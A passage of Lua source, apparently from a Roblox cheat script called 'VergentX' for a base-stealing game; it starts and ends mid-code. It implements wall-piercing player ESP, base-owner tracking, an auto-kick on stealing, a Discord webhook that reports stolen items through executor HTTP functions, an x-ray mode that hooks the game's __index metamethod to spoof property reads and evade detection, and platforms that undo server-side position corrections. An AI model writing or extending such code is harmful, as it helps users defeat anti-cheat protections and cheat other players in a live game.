        highlight.FillColor = accent
        highlight.FillTransparency = 0.72
        highlight.OutlineColor = accent
        highlight.OutlineTransparency = 0
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        espMount(highlight)

        local shownTags = 0
        for _, tag in ipairs(tags) do
            if tag ~= "Owner" then shownTags = shownTags + 1 end
        end

        local billboard = Instance.new("BillboardGui")
        billboard.Name = _vxName("espPlayer")
        billboard.Size = UDim2.new(0, 260, 0, 30 + shownTags * 20)
        billboard.StudsOffset = Vector3.new(0, 1.5, 0)
        billboard.AlwaysOnTop = true
        billboard.LightInfluence = 0
        billboard.MaxDistance = 2000
        billboard.ResetOnSpawn = false
        billboard.Adornee = anchorPart
        espMount(billboard)

        local stack = Instance.new("UIListLayout", billboard)
        stack.FillDirection = Enum.FillDirection.Vertical
        stack.HorizontalAlignment = Enum.HorizontalAlignment.Center
        stack.VerticalAlignment = Enum.VerticalAlignment.Bottom
        stack.SortOrder = Enum.SortOrder.LayoutOrder
        stack.Padding = UDim.new(0, 1)

        for i, tag in ipairs(tags) do
            if tag ~= "Owner" then
                local t = Instance.new("TextLabel", billboard)
                t.Name = "Tag_" .. tag
                t.LayoutOrder = i
                t.Size = UDim2.new(1, 0, 0, 19)
                t.BackgroundTransparency = 1
                t.BorderSizePixel = 0
                t.Text = "[" .. tag .. "]"
                t.Font = Enum.Font.GothamBold
                t.TextSize = 16
                t.TextColor3 = ESP_GROUP_COLORS[tag] or accent
                t.TextStrokeTransparency = 0.15
                t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
            end
        end

        local nameLabel = Instance.new("TextLabel", billboard)
        nameLabel.Name = "NameLabel"
        nameLabel.LayoutOrder = shownTags + 1
        nameLabel.Size = UDim2.new(1, 0, 0, 26)
        nameLabel.BackgroundTransparency = 1
        nameLabel.BorderSizePixel = 0
        nameLabel.Text = "@" .. player.DisplayName
        nameLabel.Font = Enum.Font.GothamBold
        nameLabel.TextSize = 20
        nameLabel.TextColor3 = isOwner and ESP_GROUP_COLORS.Owner or Theme.GoldHi
        nameLabel.TextStrokeTransparency = 0.15
        nameLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)

        playerESPData[player.UserId] = {
            highlight = highlight,
            billboard = billboard,
            anchor = anchorPart,
            player = player,
            tagKey = table.concat(tags, ","),
        }
        return true
    end

    local function removePlayerESP(player)
        local data = playerESPData[player.UserId]
        if data then
            if data.highlight then pcall(function() data.highlight:Destroy() end) end
            if data.billboard then pcall(function() data.billboard:Destroy() end) end
            playerESPData[player.UserId] = nil
        end
    end

    local function clearAllPlayerESP()
        for _, data in pairs(playerESPData) do
            if data.highlight then pcall(function() data.highlight:Destroy() end) end
            if data.billboard then pcall(function() data.billboard:Destroy() end) end
        end
        playerESPData = {}
    end

    local function refreshPlayerESP()
        local ownerId = (CONFIG.BASE_OWNER_ESP == true) and _G.VXBaseOwnerUserId or nil
        if not playerESPEnabled and not ownerId then
            clearAllPlayerESP()
            return
        end
        local current = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LP and (playerESPEnabled or player.UserId == ownerId) then
                current[player.UserId] = true
                local d = playerESPData[player.UserId]
                local stale = d and (not d.anchor or not d.anchor.Parent
                    or not d.billboard or not d.billboard.Parent)
                if stale then
                    removePlayerESP(player)
                    d = nil
                end
                if not d then createPlayerESP(player) end
            end
        end
        for userId, data in pairs(playerESPData) do
            if not current[userId] then
                local player = Players:GetPlayerByUserId(userId)
                if player then
                    removePlayerESP(player)
                else
                    if data.highlight then pcall(function() data.highlight:Destroy() end) end
                    if data.billboard then pcall(function() data.billboard:Destroy() end) end
                    playerESPData[userId] = nil
                end
            end
        end
    end

    local function onCharacterAdded(player)
        return function()
            task.wait(0.5)
            if playerESPEnabled and player ~= LP then
                removePlayerESP(player)
                createPlayerESP(player)
            end
        end
    end

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP then
            player.CharacterAdded:Connect(onCharacterAdded(player))
        end
    end

    vxBind(Players.PlayerAdded, function(player)
        if player ~= LP then
            player.CharacterAdded:Connect(onCharacterAdded(player))
            task.wait(0.5)
            if playerESPEnabled then createPlayerESP(player) end
        end
    end)

    vxBind(Players.PlayerRemoving, removePlayerESP)

    task.spawn(function()
        local function plotBoxContains(plot, pos)
            local podiums = plot:FindFirstChild("AnimalPodiums")
            if not podiums then return false end
            local minX, maxX, minZ, maxZ = math.huge, -math.huge, math.huge, -math.huge
            local cnt = 0
            for _, p in ipairs(podiums:GetChildren()) do
                local base = p:FindFirstChild("Base")
                local spawnP = base and base:FindFirstChild("Spawn")
                local checkPos = (spawnP and spawnP.Position) or (base and base.Position)
                if checkPos then
                    cnt = cnt + 1
                    minX = math.min(minX, checkPos.X); maxX = math.max(maxX, checkPos.X)
                    minZ = math.min(minZ, checkPos.Z); maxZ = math.max(maxZ, checkPos.Z)
                end
            end
            if cnt == 0 then return false end
            local sizeX = (maxX - minX) + 13
            local sizeZ = (maxZ - minZ) + 8
            local maxY = (cnt <= 10 and 10) or (cnt <= 18 and 25) or 40
            return pos.Y <= maxY and pos.Y >= -10
                and math.abs(pos.X - (minX + maxX) / 2) <= sizeX / 2
                and math.abs(pos.Z - (minZ + maxZ) / 2) <= sizeZ / 2
        end
        while true do
            task.wait(0.4)
            if not vxAlive() then return end
            if CONFIG.BASE_OWNER_ESP == true then
                local newOwnerId = nil
                pcall(function()
                    local hrp = espHrp()
                    local plots = Workspace:FindFirstChild("Plots")
                    if not hrp or not plots then return end
                    for _, plot in ipairs(plots:GetChildren()) do
                        if plotBoxContains(plot, hrp.Position) then
                            local ch = _G.VXSyncGet and _G.VXSyncGet(plot.Name)
                            if ch then
                                local owner = _G.VXsProp(ch, "Owner")
                                local ownerId = (typeof(owner) == "Instance" and owner:IsA("Player") and owner.UserId)
                                    or (type(owner) == "table" and rawget(owner, "UserId"))
                                if ownerId and ownerId ~= LP.UserId then newOwnerId = ownerId end
                            end
                            break
                        end
                    end
                end)
                _G.VXBaseOwnerUserId = newOwnerId
            elseif _G.VXBaseOwnerUserId ~= nil then
                _G.VXBaseOwnerUserId = nil
            end
        end
    end)

    local pesAcc = 0
    vxBind(RunService.Heartbeat, function(dt)
        playerESPEnabled = CONFIG.PLAYER_ESP == true
        local ownerActive = (CONFIG.BASE_OWNER_ESP == true) and (_G.VXBaseOwnerUserId ~= nil)
        if playerESPEnabled or ownerActive then
            pesAcc = pesAcc + dt
            if pesAcc < 0.5 then return end
            pesAcc = 0
            refreshPlayerESP()
            for _, data in pairs(playerESPData) do
                local plr = data.player
                if plr and plr.Parent then
                    local key = table.concat(espGroupTags(plr), ",")
                    if key ~= data.tagKey then
                        removePlayerESP(plr)
                        createPlayerESP(plr)
                    end
                end
            end
        elseif next(playerESPData) then
            clearAllPlayerESP()
        end
    end)

    F.setPlayerESP = function(on)
        CONFIG.PLAYER_ESP = on and true or false
        playerESPEnabled = CONFIG.PLAYER_ESP
        if not playerESPEnabled and not (CONFIG.BASE_OWNER_ESP and _G.VXBaseOwnerUserId) then
            clearAllPlayerESP()
        end
        saveConfig()
    end

    F.setBaseOwnerESP = function(on)
        CONFIG.BASE_OWNER_ESP = on and true or false
        if not CONFIG.BASE_OWNER_ESP then
            _G.VXBaseOwnerUserId = nil
            if not CONFIG.PLAYER_ESP then clearAllPlayerESP() end
        end
        saveConfig()
    end
end

_G.VXKickVisuals = {}
_G.VXSyncKickVisuals = function(on)
    local list = _G.VXKickVisuals
    for i = 1, #list do pcall(list[i], on) end
end

do
    local enabled = false
    local hooked = {}
    local conns = {}

    local stoleSubs = {}

    _G.VXOnStoleText = function(fn)
        stoleSubs[#stoleSubs + 1] = fn
    end

    local function kickSelf()
        pcall(function() game:Shutdown() end)
        pcall(function() LP:Kick("\nDisconnected by VergentX Kick on Steal") end)
    end

    local function checkText(text)
        if type(text) ~= "string" or text == "" then return end
        if not string.find(text, "tole", 1, true) then return end
        if not string.find(string.lower(text), "you stole", 1, true) then return end

        for i = 1, #stoleSubs do
            task.spawn(stoleSubs[i])
        end

        if enabled then kickSelf() end
    end

    local function hookObj(obj)
        if hooked[obj] then return end
        hooked[obj] = true
        if obj.Text then checkText(obj.Text) end
        table.insert(conns, obj:GetPropertyChangedSignal("Text"):Connect(function()
            checkText(obj.Text)
        end))
    end

    local function watchRoot(root)
        for _, obj in ipairs(root:GetDescendants()) do
            if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
                hookObj(obj)
            end
        end
        table.insert(conns, root.DescendantAdded:Connect(function(desc)
            if desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox") then
                hookObj(desc)
            end
        end))
    end

    for _, gui in ipairs(PlayerGui:GetChildren()) do watchRoot(gui) end
    table.insert(conns, PlayerGui.ChildAdded:Connect(watchRoot))

    F.setAutoKick = function(on)
        enabled = on and true or false
        CONFIG.AUTO_KICK = enabled
        saveConfig()
        if _G.VXSyncKickVisuals then _G.VXSyncKickVisuals(enabled) end
    end
end

do
    local WEBHOOK_URL = ""
    local PENDING_TTL = 120
    local REMOVED_TTL = 90
    local MIN_BRAINROT = "Globa Steppa"

    local pending = nil

    local httpRequest = (typeof(syn) == "table" and syn.request)
        or (typeof(http) == "table" and http.request)
        or http_request
        or (typeof(fluxus) == "table" and fluxus.request)
        or request

    local _ownStatic = nil
    local function ownStaticRow(want)
        if _ownStatic == nil then
            local ok, AD = pcall(function()
                local d = ReplicatedStorage:FindFirstChild("Datas")
                local a = d and d:FindFirstChild("Animals")
                return a and require(a) or nil
            end)
            if not ok or type(AD) ~= "table" then return nil end

            local NU = nil
            local function short(v)
                v = tonumber(v) or 0
                if NU and NU.ToString then
                    local o, s = pcall(function() return NU:ToString(v) end)
                    if o and s then return "$" .. s .. "/s" end
                end
                for _, u in ipairs({ { 1e15, "Q" }, { 1e12, "T" }, { 1e9, "B" }, { 1e6, "M" }, { 1e3, "K" } }) do
                    if math.abs(v) >= u[1] then
                        local s = string.format("%.2f", v / u[1]):gsub("%.?0+$", "")
                        return "$" .. s .. u[2] .. "/s"
                    end
                end
                return "$" .. tostring(math.floor(v + 0.5)) .. "/s"
            end

            _ownStatic = {}
            for idx, info in pairs(AD) do
                if type(info) == "table" then
                    local gv = tonumber(info.Generation) or 0
                    local row = {
                        name = info.DisplayName or tostring(idx),
                        index = idx,
                        rarity = info.Rarity,
                        price = info.Price,
                        genValue = gv, genText = short(gv),
                        mutation = "None", traits = "None",
                        _static = true,
                    }
                    _ownStatic[string.lower(tostring(idx))] = row
                    if info.DisplayName then
                        _ownStatic[string.lower(tostring(info.DisplayName))] = row
                    end
                end
            end
        end
        if not _ownStatic then return nil end
        return _ownStatic[want]
    end

    local lastTier = "none"
    local function resolveStolenRow(stealingIndex)
        lastTier = "none"
        if stealingIndex == nil then return nil end
        local want = string.lower(tostring(stealingIndex))
        if want == "" then return nil end

        local removed = _G.VXRemovedAnimals and _G.VXRemovedAnimals[want]
        if type(removed) == "table" and (os.clock() - (removed.at or 0)) < REMOVED_TTL then
            lastTier = "removed"
            return removed
        end

        local cache = _G.VXGetBrainrots and _G.VXGetBrainrots()
        if type(cache) == "table" then
            for i = 1, #cache do
                local pet = cache[i]
                if type(pet) == "table"
                and ((pet.index and string.lower(tostring(pet.index)) == want)
                    or (pet.name and string.lower(tostring(pet.name)) == want)) then
                    lastTier = "live"
                    return pet
                end
            end
        end

        local seen = _G.VXLastSeenRow and _G.VXLastSeenRow(want)
        if seen then lastTier = "lastSeen" return seen end

        local st = _G.VXStaticRow and _G.VXStaticRow(want) or nil
        if st then lastTier = "static" return st end

        st = ownStaticRow(want)
        if st then lastTier = "ownStatic" end
        return st
    end

    local function rowQuality(row)
        if type(row) ~= "table" then return 0 end
        if row._static then return 1 end
        return 2
    end

    local function capture()
        local idx = LP:GetAttribute("StealingIndex")
        if idx == nil then return end
        local key = tostring(idx)

        if pending and pending.key ~= key then pending = nil end

        local row = resolveStolenRow(idx)
        local q = rowQuality(row)
        if pending and q <= pending.q then return end

        local info = {
            key = key,
            keyType = typeof(idx),
            name = key,
            t = (pending and pending.t) or os.clock(),
            q = q,
        }
        if row then
            info.name     = row.name or key
            info.gen      = row.genText
            info.mutation = row.mutation
            info.traits   = row.traits
            info.price    = row.price
        end
        pending = info
    end

    local refineGen = 0
    local function startRefine()
        refineGen = refineGen + 1
        local mine = refineGen
        task.spawn(function()
            local t0 = os.clock()
            while refineGen == mine and (os.clock() - t0) < 8 do
                capture()
                if pending and pending.q >= 2 then return end
                task.wait(0.25)
            end
        end)
    end

    local function send(info)
        if not (info and info.name and httpRequest) then return end

        local want = string.lower(tostring(info.name))
        local fill = (_G.VXStaticRow and _G.VXStaticRow(want)) or ownStaticRow(want)
        if fill and fill.name then info.name = fill.name end

        local function baseGen(n)
            if n == nil then return nil end
            local k = string.lower(tostring(n))
            local g = _G.VXBaseGenByName and _G.VXBaseGenByName(k)
            if g then return g end
            local r = ownStaticRow(k)
            return r and r.genValue or nil
        end

        local minG = baseGen(MIN_BRAINROT)
        if minG then
            local myG = baseGen(info.name) or baseGen(info.key)
            if (not myG) or myG < minG then return end
        end

        local payload = {
            username = "VergentX",
            embeds = { {
                title = "Brainrot Stolen!",
                description = "**" .. tostring(info.name) .. "** has been stolen!",
                color = 13148226,
                fields = {
                    { name = "Stealer", value = "@" .. LP.Name, inline = false },
                },
                footer = { text = "VergentX | discord.gg/vergent" },
                timestamp = DateTime.now():ToIsoDate(),
            } },
        }

        pcall(function()
            httpRequest({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(payload),
            })
        end)
    end

    _G.VXOnStoleText(function()
        local p = pending
        pending = nil
        if not p then return end
        if (os.clock() - (p.t or 0)) > PENDING_TTL then return end
        send(p)
    end)

    vxBind(LP:GetAttributeChangedSignal("Stealing"), function()
        if LP:GetAttribute("Stealing") then
            capture()
            startRefine()
        else
            refineGen = refineGen + 1
        end
    end)
    vxBind(LP:GetAttributeChangedSignal("StealingIndex"), function()
        if LP:GetAttribute("Stealing") then capture() end
    end)
end

do
    local enabled = false
    local TRANSPARENCY = 0.8
    local spoofed = {}
    local oldIndex = nil
    local addedConn = nil

    local function shouldXray(obj)
        if not obj:IsA("BasePart") then return false end
        local n = obj.Name:lower()
        local p = obj.Parent and obj.Parent.Name:lower() or ""
        return n:find("base") or n:find("claim") or p:find("base") or p:find("claim")
    end

    local function apply(obj)
        if not enabled then return end
        if not shouldXray(obj) then return end
        spoofed[obj] = 0
        obj.LocalTransparencyModifier = TRANSPARENCY
    end

    F.setXray = function(on)
        CONFIG.XRAY = on and true or false

        if on and not enabled then
            enabled = true
            if not oldIndex and hookmetamethod then
                pcall(function()
                    local wrap = (typeof(newcclosure) == "function")
                        and newcclosure
                        or function(f) return f end
                    oldIndex = hookmetamethod(game, "__index", wrap(function(self, key)
                        if key == "LocalTransparencyModifier" then
                            local v = spoofed[self]
                            if v ~= nil then return v end
                        end
                        return oldIndex(self, key)
                    end))
                end)
            end
            for _, obj in ipairs(Workspace:GetDescendants()) do apply(obj) end
            addedConn = Workspace.DescendantAdded:Connect(function(obj)
                task.wait()
                apply(obj)
            end)
        elseif not on then
            enabled = false
            for obj in pairs(spoofed) do
                spoofed[obj] = nil
                pcall(function() obj.LocalTransparencyModifier = 0 end)
            end
            spoofed = {}
            if addedConn then addedConn:Disconnect(); addedConn = nil end
        end

        saveConfig()
    end
end

local SlotBoxes = {}
do
    local FLOOR_TOL, SAME_COL_R = 8, 3
    local cache = setmetatable({}, { __mode = "k" })

    local KNOWN_OFFSETS = { 18, 35 }
    local DEFAULT_SIZE  = Vector3.new(6, 1, 6)

    SlotBoxes.PODIUM_LIMIT = 11

    local canonSize = nil

    local ownCache, ownCacheAt = setmetatable({}, { __mode = "k" }), 0

    local function isOwnPlot(plot)
        local now = os.clock()
        if now - ownCacheAt > 2 then
            ownCache = setmetatable({}, { __mode = "k" })
            ownCacheAt = now
        end

        local hit = ownCache[plot]
        if hit ~= nil then return hit end

        local mine = false
        local sign = plot:FindFirstChild("PlotSign")
        if sign then
            local yb = sign:FindFirstChild("YourBase")
            if yb and yb:IsA("BillboardGui") and yb.Enabled then mine = true end
        end
        if not mine and Brainrots and Brainrots.OwnerOf then
            local ok, owner = pcall(Brainrots.OwnerOf, plot.Name)
            if ok and type(owner) == "string" and owner ~= "" then
                mine = owner == LP.Name or owner == LP.DisplayName
            end
        end

        ownCache[plot] = mine
        return mine
    end
    SlotBoxes.IsOwnPlot = isOwnPlot

    local function canonVolume(s)
        if not s then return math.huge end
        return s.X * s.Y * s.Z
    end

    local function readAnchor(slot)
        local base = slot:FindFirstChild("Base")
        local sp = base and base:FindFirstChild("Spawn")
        if sp and sp:IsA("BasePart") then return sp.CFrame, true end
        if base and base:IsA("BasePart") then return base.CFrame, true end
        local ok, piv = pcall(function() return slot:GetPivot() end)
        if ok then return piv, false end
        return nil, false
    end

    local function slotAnchor(slot)
        local c = cache[slot]
        if c and c.static then return c.cf, true end

        local cf, static = readAnchor(slot)
        if not cf then
            if c then return c.cf, false end
            return nil, false
        end
        if c and not static then return c.cf, false end

        cache[slot] = { cf = cf, static = static }
        return cf, static
    end

    local function rawSize(slot)
        local base = slot:FindFirstChild("Base")
        if base and base:IsA("BasePart") then return base.Size end
        if base and base:IsA("Model") then
            local ok, _, s = pcall(function() return base:GetBoundingBox() end)
            if ok then return s end
        end
        return nil
    end

    local function measureCanon()
        local seen = {}
        for _, plot in ipairs(Plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods then
                for _, sl in ipairs(pods:GetChildren()) do
                    local s = rawSize(sl)
                    if s then
                        local key = string.format("%.2f|%.2f|%.2f", s.X, s.Y, s.Z)
                        local e = seen[key]
                        if e then e.n = e.n + 1 else seen[key] = { n = 1, size = s } end
                    end
                end
            end
        end

        local best, bestN = nil, 0
        for _, e in pairs(seen) do
            if e.n > bestN
                or (e.n == bestN and canonVolume(e.size) < canonVolume(best)) then
                best, bestN = e.size, e.n
            end
        end

        if best then canonSize = best end
        return canonSize or DEFAULT_SIZE
    end

    local function columnTaken(live, p)
        for _, q in ipairs(live) do
            local dx, dz = q.X - p.X, q.Z - p.Z
            if math.sqrt(dx * dx + dz * dz) <= SAME_COL_R
                and math.abs(q.Y - p.Y) <= FLOOR_TOL then
                return true
            end
        end
        return false
    end

    local function floorOffsets()
        local best
        for _, plot in ipairs(Plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods then
                local ys = {}
                for _, sl in ipairs(pods:GetChildren()) do
                    local cf = slotAnchor(sl)
                    if cf then ys[#ys + 1] = cf.Position.Y end
                end
                table.sort(ys)
                local lv = {}
                for _, y in ipairs(ys) do
                    local found = false
                    for _, l in ipairs(lv) do
                        if math.abs(l - y) <= FLOOR_TOL then found = true break end
                    end
                    if not found then lv[#lv + 1] = y end
                end
                if not best or #lv > #best then best = lv end
            end
        end
        local offs = {}
        if best and #best >= 2 then
            for i = 2, #best do offs[#offs + 1] = best[i] - best[1] end
        end
        if #offs < #KNOWN_OFFSETS then
            offs = {}
            for i, v in ipairs(KNOWN_OFFSETS) do offs[i] = v end
        end
        return offs
    end

    function SlotBoxes.Collect()
        local out   = {}
        local offs  = floorOffsets()
        local sz    = measureCanon()
        local halfY = sz.Y * 0.5

        for _, plot in ipairs(Plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods and not isOwnPlot(plot) then
                local anchors, rot, anyRot = {}, nil, nil
                for _, sl in ipairs(pods:GetChildren()) do
                    local cf, static = slotAnchor(sl)
                    if cf then
                        anchors[#anchors + 1] = cf
                        if not anyRot then anyRot = cf - cf.Position end
                        if static and not rot then rot = cf - cf.Position end
                    end
                end
                rot = rot or anyRot

                if #anchors > 0 then
                    local ys = {}
                    for _, cf in ipairs(anchors) do ys[#ys + 1] = cf.Position.Y end
                    table.sort(ys)

                    local lv = {}
                    for _, y in ipairs(ys) do
                        local hit = nil
                        for _, l in ipairs(lv) do
                            if math.abs(l[1] - y) <= FLOOR_TOL then hit = l break end
                        end
                        if hit then hit[#hit + 1] = y else lv[#lv + 1] = { y } end
                    end

                    local levelY = {}
                    for i, l in ipairs(lv) do levelY[i] = l[math.ceil(#l * 0.5)] end

                    local function snapY(y)
                        local pick, bd = y, math.huge
                        for _, ly in ipairs(levelY) do
                            local d = math.abs(ly - y)
                            if d < bd then bd, pick = d, ly end
                        end
                        return pick
                    end

                    local slots, live, minY = {}, {}, math.huge
                    for _, cf in ipairs(anchors) do
                        local p = cf.Position
                        local flat = rot + Vector3.new(p.X, snapY(p.Y) - halfY, p.Z)
                        slots[#slots + 1] = { cf = flat, sz = sz, plot = plot }
                        live[#live + 1] = flat.Position
                        minY = math.min(minY, flat.Position.Y)
                    end

                    local plotBoxes = {}
                    for _, s in ipairs(slots) do plotBoxes[#plotBoxes + 1] = s end
                    for _, s in ipairs(slots) do
                        if s.cf.Position.Y <= minY + FLOOR_TOL then
                            for _, dy in ipairs(offs) do
                                local up = s.cf + Vector3.new(0, dy, 0)
                                if not columnTaken(live, up.Position) then
                                    plotBoxes[#plotBoxes + 1] = { cf = up, sz = sz, plot = plot }
                                    live[#live + 1] = up.Position
                                end
                            end
                        end
                    end

                    local tiers = {}
                    for _, b in ipairs(plotBoxes) do
                        local y = b.cf.Position.Y
                        local known = false
                        for _, ty in ipairs(tiers) do
                            if math.abs(ty - y) <= FLOOR_TOL then known = true break end
                        end
                        if not known then tiers[#tiers + 1] = y end
                    end

                    local topTier = -math.huge
                    for _, ty in ipairs(tiers) do
                        if ty > topTier then topTier = ty end
                    end

                    for _, b in ipairs(plotBoxes) do
                        b.isTop = #tiers >= 2 and b.cf.Position.Y >= topTier - FLOOR_TOL
                        out[#out + 1] = b
                    end
                end
            end
        end
        return out
    end

    local countCache = setmetatable({}, { __mode = "k" })
    local countAt = setmetatable({}, { __mode = "k" })

    function SlotBoxes.PodiumCount(plot)
        if typeof(plot) == "string" then plot = Plots:FindFirstChild(plot) end
        if typeof(plot) ~= "Instance" then return 0 end

        local hit = countCache[plot]
        if hit and (os.clock() - (countAt[plot] or 0)) < 1 then return hit end

        local pods = plot:FindFirstChild("AnimalPodiums")
        if not pods then return 0 end

        local real, total = 0, 0
        for _, sl in ipairs(pods:GetChildren()) do
            total = total + 1
            if sl:FindFirstChild("Base") then real = real + 1 end
        end
        if real == 0 then real = total end

        countCache[plot] = real
        countAt[plot] = os.clock()
        return real
    end

    local sigBuf = {}

    function SlotBoxes.Signature()
        local n = 0
        for _, plot in ipairs(Plots:GetChildren()) do
            local pods = plot:FindFirstChild("AnimalPodiums")
            if pods then
                n = n + 1
                sigBuf[n] = plot.Name
                    .. ":" .. tostring(SlotBoxes.PodiumCount(plot))
                    .. ":" .. (isOwnPlot(plot) and "1" or "0")
            end
        end
        for i = #sigBuf, n + 1, -1 do sigBuf[i] = nil end
        table.sort(sigBuf)
        return table.concat(sigBuf, "|")
    end
end

do
    local enabled = false
    local holder = nil
    local buildPending = false
    local conns = {}
    local watchGen = 0

    local COLOR = COLORS.gold

    local function makeBox(cf, size)
        local a = Instance.new("Part")
        a.Anchored = true
        a.CanCollide = false
        a.CanQuery = false
        a.CanTouch = false
        a.Transparency = 1
        a.Size = size
        a.CFrame = cf
        a.Parent = holder

        local b = Instance.new("SelectionBox")
        b.Adornee = a
        b.Color3 = COLOR
        b.SurfaceColor3 = COLOR
        b.LineThickness = 0.06
        b.Transparency = 0
        b.SurfaceTransparency = 0.85
        b.Parent = a
    end

    local function build()
        if not holder then return end
        for _, c in ipairs(holder:GetChildren()) do c:Destroy() end
        for _, b in ipairs(SlotBoxes.Collect()) do makeBox(b.cf, b.sz) end
    end

    local function rebuild()
        if buildPending then return end
        buildPending = true
        task.delay(0.4, function()
            buildPending = false
            if enabled then build() end
        end)
    end

    F.setSlotESP = function(on)
        enabled = on and true or false
        CONFIG.SLOT_ESP = enabled

        local old = Workspace:FindFirstChild("__VXPodiumMarkers")
        if old then old:Destroy() end
        holder = nil

        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}
        watchGen = watchGen + 1

        if enabled then
            holder = Instance.new("Folder")
            holder.Name = "__VXPodiumMarkers"
            holder.Parent = Workspace

            build()

            local function watch(plot)
                local pods = plot:FindFirstChild("AnimalPodiums")
                if pods then
                    conns[#conns + 1] = pods.ChildAdded:Connect(rebuild)
                    conns[#conns + 1] = pods.ChildRemoved:Connect(rebuild)
                else
                    conns[#conns + 1] = plot.ChildAdded:Connect(function(c)
                        if c.Name == "AnimalPodiums" then
                            conns[#conns + 1] = c.ChildAdded:Connect(rebuild)
                            conns[#conns + 1] = c.ChildRemoved:Connect(rebuild)
                            rebuild()
                        end
                    end)
                end
            end

            for _, plot in ipairs(Plots:GetChildren()) do watch(plot) end
            conns[#conns + 1] = Plots.ChildAdded:Connect(function(plot)
                watch(plot)
                rebuild()
            end)
            conns[#conns + 1] = Plots.ChildRemoved:Connect(rebuild)

            local mine = watchGen
            task.spawn(function()
                local lastSig = nil
                while vxAlive() and mine == watchGen do
                    local ok, sig = pcall(SlotBoxes.Signature)
                    if ok and sig ~= lastSig then
                        if lastSig ~= nil then rebuild() end
                        lastSig = sig
                    end
                    task.wait(2)
                end
            end)
        end

        saveConfig()
    end
end

do
    local enabled = false
    local holder = nil
    local buildPending = false
    local conns = {}
    local watchGen = 0
    local boxes = {}
    local lastGood, lastGoodAt = nil, 0
    local lastFightAt, fightCount = 0, 0

    local function makePlatform(cf, size)
        local p = Instance.new("Part")
        p.Name = "VXSlotPlatform"
        p.Anchored = true
        p.CanCollide = true
        p.CanQuery = false
        p.CanTouch = false
        p.Massless = true
        p.Transparency = 1
        p.Material = Enum.Material.SmoothPlastic
        p.TopSurface = Enum.SurfaceType.Smooth
        p.BottomSurface = Enum.SurfaceType.Smooth
        p.Size = size
        p.CFrame = cf
        p.Parent = holder
    end

    local function build()
        if not holder then return end
        for _, c in ipairs(holder:GetChildren()) do c:Destroy() end
        boxes = SlotBoxes.Collect()
        for _, b in ipairs(boxes) do
            makePlatform(b.cf, b.sz)

            local c = b.cf.Position
            b.px, b.py, b.pz = c.X, c.Y, c.Z
            local hx = b.sz.X * 0.5 + 2
            local hy = b.sz.Y * 0.5 + 6
            local hz = b.sz.Z * 0.5 + 2
            b.r2 = hx * hx + hy * hy + hz * hz
        end
    end

    local function rebuild()
        if buildPending then return end
        buildPending = true
        task.delay(0.4, function()
            buildPending = false
            if enabled then build() end
        end)
    end

    local function boxHit(b, pos)
        local lp = b.cf:PointToObjectSpace(pos)
        local hx, hy, hz = b.sz.X * 0.5, b.sz.Y * 0.5, b.sz.Z * 0.5
        return math.abs(lp.X) <= hx + 2 and math.abs(lp.Z) <= hz + 2
            and lp.Y >= hy - 1.5 and lp.Y <= hy + 6
    end

    local lastBox = nil

    local function standingOn(pos)
        local memo = lastBox and boxes[lastBox]
        if memo and boxHit(memo, pos) then
            return true, memo.isTop and true or false, memo.plot
        end

        local px, py, pz = pos.X, pos.Y, pos.Z
        for i = 1, #boxes do
            local b = boxes[i]
            local dx, dy, dz = px - b.px, py - b.py, pz - b.pz
            if dx * dx + dy * dy + dz * dz <= b.r2 and boxHit(b, pos) then
                lastBox = i
                return true, b.isTop and true or false, b.plot
            end
        end
        lastBox = nil
        return false, false, nil
    end

    vxBind(RunService.Heartbeat, function()
        if not enabled then
            lastGood = nil
            return
        end

        local char = LP.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then
            lastGood = nil
            return
        end

        local onSlot, onTopSlot, slotPlot = standingOn(hrp.Position)
        if not onSlot then
            lastGood = nil
            return
        end

        if onTopSlot and not CONFIG.CARPET_SPEED and _G.VXEquipFlyTool
            and not (_G.VXFlyEquipBlocked and _G.VXFlyEquipBlocked(slotPlot)) then
            pcall(_G.VXEquipFlyTool)
        end

        local now = tick()
        if lastGood then
            local moved = (hrp.Position - lastGood.Position).Magnitude
            local budget = (hum.WalkSpeed + 80) * math.max(now - lastGoodAt, 1 / 240)
            if moved > math.max(budget, 12) then
                if (now - lastFightAt) > 1 then
                    lastFightAt = now
                    fightCount = 0
                end
                fightCount = fightCount + 1
                if fightCount <= 30 then
                    hrp.CFrame = lastGood
                    pcall(function()
                        hrp.AssemblyLinearVelocity  = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end)
                    lastGoodAt = now
                    return
                end
                lastGood = nil
                return
            end
        end

        lastGood   = hrp.CFrame
        lastGoodAt = now
    end)

    vxBind(LP.CharacterAdded, function()
        lastGood = nil
    end)

    F.setSlotPlatforms = function(on)
        enabled = on and true or false
        CONFIG.SLOT_PLATFORMS = enabled

        local old = Workspace:FindFirstChild("__VXSlotPlatforms")
        if old then old:Destroy() end
        holder = nil
        boxes = {}
        lastBox = nil

        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}
        watchGen = watchGen + 1

        if enabled then
            holder = Instance.new("Folder")
            holder.Name = "__VXSlotPlatforms"
            holder.Parent = Workspace

            build()

            local function watch(plot)
                local pods = plot:FindFirstChild("AnimalPodiums")
                if pods then
                    conns[#conns + 1] = pods.ChildAdded:Connect(rebuild)
                    conns[#conns + 1] = pods.ChildRemoved:Connect(rebuild)
                else
                    conns[#conns + 1] = plot.ChildAdded:Connect(function(c)
                        if c.Name == "AnimalPodiums" then
                            conns[#conns + 1] = c.ChildAdded:Connect(rebuild)
                            conns[#conns + 1] = c.ChildRemoved:Connect(rebuild)
                            rebuild()
                        end
                    end)
                end
            end

